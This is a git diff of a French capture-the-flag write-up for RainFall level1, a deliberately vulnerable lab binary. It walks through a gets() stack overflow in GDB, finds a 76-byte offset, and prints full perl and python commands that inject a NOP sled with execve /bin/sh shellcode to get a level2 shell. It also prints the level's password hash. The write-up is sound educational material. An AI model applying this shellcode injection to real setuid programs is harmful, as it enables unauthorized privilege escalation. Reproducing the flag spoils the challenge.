@@ -1,18 +1,7 @@
-Arriver sur le level1 Je trouve egalement un fichier level1
+Cette fois-ci, le programme ne prend pas d'arguments, mais effectue un appel un à la fonction gets pour lire l'entrée standard.
+Il n'y a pas de contrôle sur la taille, on devrait donc pouvoir utiliser un shellcode et l'appeller en réécrivant l'adresse EIP.
 
-	level1@RainFall:~$ ls -la level1
-	-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
-
-On voie que le fichier appartient a l'user level2 donc celui-ci s'executeras avec les droits de level2
-
-	level1@RainFall:~$ file level1
-	level1: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x099e580e4b9d2f1ea30ee82a22229942b231f2e0, not stripped
-
-On est encore sur un fichier binaire executable en 32 bits.
-
-Celui ci ne prend aucun argument dans la fonction main mais prend le retour d'une fonction gets celle-ci ne controle pas la taille de la valeur récuperer donc on vas pouvoir récrire l'addresse EIP et y injecter un shellcode.
-
-J'ouvre le programme avec GDB:
+On ouvre le programme avec GDB:
 
 	level1@RainFall:~$ gdb level1
 	GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
@@ -41,21 +30,32 @@ J'ouvre le programme avec GDB:
 	Breakpoint 1 at 0x8048495
 	(gdb) r
 	Starting program: /home/user/level1/level1
-	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+	AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVV
 
 	Breakpoint 1, 0x08048495 in main ()
 	(gdb) x/24xw $esp
 	0xbffff6b0:	0xbffff6c0	0x0000002f	0xbffff70c	0xb7fd0ff4
-	0xbffff6c0:	0x41414141	0x41414141	0x41414141	0x41414141
-	0xbffff6d0:	0x41414141	0x41414141	0x41414141	0x41414141
-	0xbffff6e0:	0x41414141	0x41414141	0x41414141	0x41414141
-	0xbffff6f0:	0x41414141	0x41414141	0x41414141	0x41414141
-	0xbffff700:	0x41414141	0x41414141	0x41414141	0xb7e45400
-	(gdb)
+	0xbffff6c0:	0x41414141	0x42424242	0x43434343	0x44444444
+	0xbffff6d0:	0x45454545	0x46464646	0x47474747	0x48484848
+	0xbffff6e0:	0x49494949	0x4a4a4a4a	0x4b4b4b4b	0x4c4c4c4c
+	0xbffff6f0:	0x4d4d4d4d	0x4e4e4e4e	0x4f4f4f4f	0x50505050
+	0xbffff700:	0x51515151	0x52525252	0x53535353	0x54545454
+	(gdb) c
+	Continuing.
 
-Ce que je fais dans GDB c'est que je dissas le main, je pose un breakpoint après l'appel a ma fonction gets.
-Je run le programme et j'ecrit 76 A, je vais lire les addresse de mon programme pour voir ou ce sont écrit les 'A' (41) Je prend une des addresse et je la retourne pour l'écrire en little endian.
+	Program received signal SIGSEGV, Segmentation fault.
+	0x54545454 in ?? ()
 
-Je sort de GDB et j'inject mon shellcode de 46 bit dans le programme celui-ci m'ouvre le terminal avec les droits du level2.
+On déssassemble le main dans gdb pour y voir les instructions ASM effectuées, puis pose un breakpoint après l'appel à gets pour regarder l'état de la stack, et
+ainsi trouver où se situe notre variable.
+On sait que la variable fait 76 octets(CF source), qu'on a pu vérifier via le segfault (segfault après 76 caractère, 54545454 correponsant au T, donc le programme a segfault
+après 19*4 caractères, soit 76). Le but va être d'insérer notre shellcode parmi ces 76 caractères, puis de faire revenir le programme dessus pour qu'il l'exécute.
 
-	cat <( perl -e 'print "\x90"x30 . "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68" . "\xe0\xf6\xff\xbf"' ) - | ./level1
+python -c "print '\x90'*30 +'\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68' + '\x00\xf7\xff\xbf'" > /tmp/level1
+whoami
+level2
+cd ../; cd level2; cat .pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+
+On remplit les 30 premiers caractères du buffer de \x90, des NOP (No OPerations, pour qu'il passe simplement à l'instruction suivante), puis les 46 caractères de notre shellcode. Les caractères suivants
+correspondent au registre EIP, on les réécrit donc avec une des adresses dans le pool de NOP (écriture en little endian).
